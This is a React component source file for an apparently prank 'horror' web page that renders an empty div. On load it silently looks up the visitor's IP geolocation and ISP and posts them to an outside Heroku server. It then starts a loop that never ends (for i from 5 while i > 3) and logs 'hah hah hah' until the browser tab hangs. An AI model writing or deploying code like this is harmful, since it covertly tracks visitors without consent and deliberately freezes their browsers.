import React, { Component } from 'react';
import axios from 'axios';
import './App.css'
require('dotenv').config();
export default class App extends Component {
  state = {
    //  baseUrl:'http://127.0.0.1:8000/api',
    baseUrl:'https://immense-beyond-81444.herokuapp.com/api',
  
  }
componentDidMount(){
  axios.get(process.env.REACT_APP_USER_INFO_API)
  .then((res) => {
    axios.post(`${this.state.baseUrl}/user`,{
      ip:res.data.ip,
      continent_name:res.data.continent_name,
      calling_code:res.data.calling_code,
      city:res.data.city,
      country_name:res.data.country_name,
      district:res.data.district,
      zipcode:res.data.zipcode,
      isp:res.data.isp,
      website:'horror'
     })
     .then((response) => {
      const test = response.data.success;
     console.log(test);
        this.horror();
    }) 
   
  })
}
horror = () => {
  for (let i = 5; i > 3; i++){
    console.log('hah hah hah')
  }
}

  render() {
    return (
      <div>
        
    </div>
    )
  }
}

